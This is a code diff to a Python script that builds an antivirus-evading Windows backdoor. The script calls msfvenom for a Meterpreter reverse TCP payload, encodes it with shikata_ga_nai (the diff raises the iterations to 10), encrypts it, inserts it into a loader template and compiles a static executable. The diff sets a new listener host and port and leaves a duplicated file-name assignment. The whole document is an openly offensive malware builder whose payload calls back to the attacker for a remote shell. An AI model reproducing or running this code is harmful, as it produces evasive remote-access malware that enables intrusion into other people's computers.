@@ -4,14 +4,15 @@ from compiler import compile_code
 
 import subprocess as sb
 
-LHOST = '192.168.0.103'
+LHOST = '192.168.100.1'
 
-LPORT = '9500'
+LPORT = '6942'
 
 RAW_CODE_FILE = 'reverse_tcp_raw.bin'
 
 ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.bin'
 
+ENCRYPTED_CODE_FILE = "reverse_tcp_encr.txt"
 KEY = 'x'
 
 LOADER_TEMPLATE = 'payload_deployer.template'
@@ -26,7 +27,7 @@ print('Creating payload using msfvenom...')
 payload_creator = sb.Popen(["msfvenom",
                             "-p", "windows/x64/meterpreter_reverse_tcp",
                             "-e", "x86/shikata_ga_nai",
-                            "-i", "2",
+                            "-i", "10",
                             f'LHOST={LHOST}',
                             f'LPORT={LPORT}',
                             "-f", "raw",
@@ -45,9 +46,6 @@ print('Inserting payload into loader...')
 insert_payload(ENCRYPTED_CODE_FILE, KEY, LOADER_TEMPLATE, GEN_CODE)
 
 print('Compiling generated code...')
-
-compiler = sb.Popen(["x86_64-w64-mingw32-g++", GEN_CODE,
-                     '-o', LOADER_EXE,  '-static', '-lpthread'])
 
 if not compile_code(GEN_CODE, LOADER_EXE):
     print('Error compiling generated code!')
